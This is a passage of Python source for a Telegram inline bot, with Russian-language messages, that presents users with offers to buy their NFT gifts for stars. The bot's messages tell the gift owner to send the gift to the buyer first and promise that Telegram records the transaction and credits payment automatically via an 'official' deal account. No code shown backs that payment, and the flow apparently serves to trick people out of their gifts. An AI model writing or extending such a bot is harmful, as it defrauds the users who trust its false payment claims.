            )
            kb = transfer_keyboard(offer_id, buyer)
        else:
            text = "Вы приняли предложение. Передайте подарок пользователю, звёзды поступят на баланс сразу же."
            kb = None
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                reply_markup=kb,
            )
        elif callback.message:
            await callback.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest:
        pass


@dp.callback_query(F.data.startswith("sent_gift:"))
async def sent_gift_callback(callback: CallbackQuery):
    try:
        offer_id = int((callback.data or "").split(":", 1)[1])
        offer = db.get_offer(offer_id)
    except (ValueError, LookupError):
        await callback.answer("Оффер не найден", show_alert=True)
        return
    buyer = offer["buyer_username"] or ""
    text = (
        "✅ <b>Вы передали подарок!</b>\n\n"
        "Подарок отправлен пользователю "
        f"<a href=\"https://t.me/{buyer}\">@{buyer}</a>.\n\n"
        "Ожидайте подтверждения получения на официальном аккаунте сделки "
        '<a href="https://t.me/GiftsToStarsBot">@GiftsToStarsBot</a>.\n\n'
        "После подтверждения сумма поступит на ваш баланс автоматически. "
        "Обычно это занимает несколько минут.\n\n"
        "⏳ Статус сделки можно отслеживать в этой ветке."
    )
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                reply_markup=None,
                parse_mode=ParseMode.HTML,
            )
        elif callback.message:
            await callback.message.edit_text(text, reply_markup=None, parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data.startswith("how_transfer:"))
async def how_transfer_callback(callback: CallbackQuery):
    try:
        offer_id = int((callback.data or "").split(":", 1)[1])
        offer = db.get_offer(offer_id)
    except (ValueError, LookupError):
        await callback.answer("Оффер не найден", show_alert=True)
        return
    buyer = offer["buyer_username"] or ""
    nft_title = f"{offer['gift_name']}#{offer['gift_number']}"
    nft_url = offer["gift_url"]
    text = (
        f"<b>Как передать подарок пользователю: @{buyer}</b>\n\n"
        f"Перейдите в профиль пользователю:\n"
        f"@{buyer}\n\n"
        f"Нажмите «Отправить подарок» и\n"
        f'выберите <a href="{nft_url}">{nft_title}</a>\n\n'
        f"Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и\n"
        f"моментально зачислит оплату на ваш\n"
        f"баланс. Резерв действует 24 часа.\n"
    )
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Вернуться к передаче", callback_data=f"back_transfer:{offer_id}")]
        ]
    )
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                reply_markup=kb,
                parse_mode=ParseMode.HTML,
            )
        elif callback.message:
            await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data.startswith("back_transfer:"))
async def back_transfer_callback(callback: CallbackQuery):
    try:
        offer_id = int((callback.data or "").split(":", 1)[1])
        offer = db.get_offer(offer_id)
    except (ValueError, LookupError):
        await callback.answer("Оффер не найден", show_alert=True)
        return
    buyer = offer["buyer_username"] or ""
    nft_title = f"{offer['gift_name']}#{offer['gift_number']}"
    nft_url = offer["gift_url"]
    buyer_name = offer["buyer_name"] or "Пользователь"
    amount = offer["amount"]
    currency = offer["currency"]
    text = build_offer_text(buyer_name, amount, currency, nft_url, nft_title)
    kb = offer_keyboard(offer_id)
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                reply_markup=kb,
                parse_mode=ParseMode.HTML,
            )
        elif callback.message:
            await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await callback.answer()


@dp.callback_query(F.data.startswith("decline:"))
async def process_decline(callback: CallbackQuery):
    try:
        await callback.answer("Вы отклонили предложение.")
    except TelegramBadRequest:
        pass
    try:
        try:
            offer_id = int((callback.data or "").split(":", 1)[1])
            db.take_pending_offer(offer_id, "declined")
        except (ValueError, LookupError):
            pass
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text="❌ Вы отклонили предложение.",
                reply_markup=None,
            )
        elif callback.message:
            await callback.message.edit_text("❌ Вы отклонили предложение.")
    except TelegramBadRequest:
        pass


async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
    print("Инлайн-бот запущен.")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(
        bot,
        allowed_updates=["message", "inline_query", "chosen_inline_result", "callback_query"],
    )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bot stopped")